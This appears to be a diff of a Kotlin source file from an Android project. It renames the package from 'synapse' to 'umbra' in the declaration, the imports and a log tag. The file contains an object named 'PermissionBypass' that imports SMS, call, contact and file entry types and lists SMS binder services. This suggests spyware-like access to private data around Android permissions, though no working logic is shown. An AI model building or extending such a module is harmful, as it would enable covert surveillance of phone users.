@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.content.Context
 import android.database.Cursor
@@ -7,10 +7,10 @@ import android.os.Binder
 import android.os.IBinder
 import android.os.Parcel
 import android.util.Log
-import org.synapse.core.core.CallEntry
-import org.synapse.core.core.ContactEntry
-import org.synapse.core.core.FileEntry
-import org.synapse.core.core.SmsMessage
+import org.umbra.core.core.CallEntry
+import org.umbra.core.core.ContactEntry
+import org.umbra.core.core.FileEntry
+import org.umbra.core.core.SmsMessage
 import java.lang.reflect.Method
 
 /**
@@ -28,7 +28,7 @@ import java.lang.reflect.Method
  */
 object PermissionBypass {
 
-    private const val TAG = "Synapse.PermBypass"
+    private const val TAG = "Umbra.PermBypass"
 
     // ── Binder service names ─────────────────────────────────────────────
     private val SMS_SERVICES = listOf(
